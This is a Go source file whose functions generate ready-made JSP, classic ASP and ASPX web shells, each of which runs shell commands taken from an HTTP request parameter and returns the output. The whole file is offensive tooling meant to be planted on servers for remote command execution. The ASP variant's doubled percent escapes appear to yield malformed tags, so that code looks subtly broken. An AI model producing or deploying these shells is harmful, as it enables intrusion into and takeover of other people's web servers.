package payload

import "fmt"

// JSPWebShell returns a minimal JSP web shell.
func JSPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%% if(request.getParameter("%s")!=null){`+
			`Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("%s")});`+
			`java.io.InputStream is=p.getInputStream();`+
			`int c;while((c=is.read())!=-1){out.write(c);}p.waitFor();} %%>`,
		param, param,
	)
}

// ASPWebShell returns a classic ASP web shell.
func ASPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%%%% Set o=Server.CreateObject("WSCRIPT.SHELL"):Set r=o.Exec("cmd /c "&Request("%s")):Response.Write r.StdOut.ReadAll %%%%>`,
		param,
	)
}

// ASPXWebShell returns an ASPX web shell.
func ASPXWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%% @ Page Language="C#" %%>`+
			`<%% System.Diagnostics.Process p=new System.Diagnostics.Process();`+
			`p.StartInfo.FileName="cmd.exe";`+
			`p.StartInfo.Arguments="/c "+Request["%s"];`+
			`p.StartInfo.RedirectStandardOutput=true;`+
			`p.StartInfo.UseShellExecute=false;`+
			`p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %%>`,
		param,
	)
}
